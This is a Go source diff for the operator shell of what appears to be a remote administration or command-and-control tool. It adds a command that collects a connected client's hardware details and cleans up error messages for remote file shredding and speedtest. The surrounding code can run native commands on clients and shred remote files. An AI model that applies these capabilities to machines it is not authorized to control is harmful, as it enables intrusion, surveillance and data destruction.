@@ -12,7 +12,6 @@ import (
 
 // Client side interactive shell menu
 func (client activeClient) shellClient() {
-
 	clientFileCompleter := func([]string) []string {
 		return client.Dir.Files
 	}
@@ -85,6 +84,11 @@ func (client activeClient) shellClient() {
 			Name: "escape",
 			Func: client.runCommand,
 			Help: "escape a command and run it natively on client",
+		},
+		{
+			Name: "hardware",
+			Func: client.Hardware,
+			Help: "collect a systems hardware specs",
 		},
 		{
 			Name: "reconnect",
@@ -261,6 +265,29 @@ func (client *activeClient) Reconnect(c *ishell.Context) {
 	c.Stop()
 }
 
+// Hardware print clients hardware info
+func (client *activeClient) Hardware(c *ishell.Context) {
+	c.ProgressBar().Indeterminate(true)
+	c.ProgressBar().Start()
+	r := shared.Hardware{}
+
+	if err := client.RPC.Call("API.GetHardware", void, &r); err != nil {
+		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not collect information on client hardware:", err))
+		c.ProgressBar().Stop()
+		return
+	}
+
+	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Hardware collection finished"))
+	c.ProgressBar().Stop()
+
+	c.Println(green("OS:     "), r.OS)
+	c.Println(green("CPU:    "), r.CPU)
+	c.Println(green("CORES:  "), r.Cores)
+	c.Println(green("RAM:    "), r.RAM)
+	c.Println(green("GPU:    "), r.GPU)
+	c.Println(green("Drives: "), r.Drives)
+}
+
 // Shred a remote file
 func (client *activeClient) Shred(c *ishell.Context) {
 	s := shared.Shred{
@@ -271,8 +298,7 @@ func (client *activeClient) Shred(c *ishell.Context) {
 	}
 
 	if err := client.RPC.Call("API.Shred", &s, &void); err != nil {
-		c.Println(red("[!] Could not shred path: ", s.Path))
-		c.Println(red("[!] ", err))
+		c.Println(red("[!] Could not shred path", s.Path+":", err))
 		return
 	}
 	c.Println(green("[+] Sucessfully shred path"))
@@ -285,9 +311,8 @@ func (client *activeClient) Speedtest(c *ishell.Context) {
 
 	r := shared.Speedtest{}
 	if err := client.RPC.Call("API.Speedtest", void, &r); err != nil {
-		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform speedtest on client"))
+		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform speedtest on client:", err))
 		c.ProgressBar().Stop()
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
 		return
 	}
 
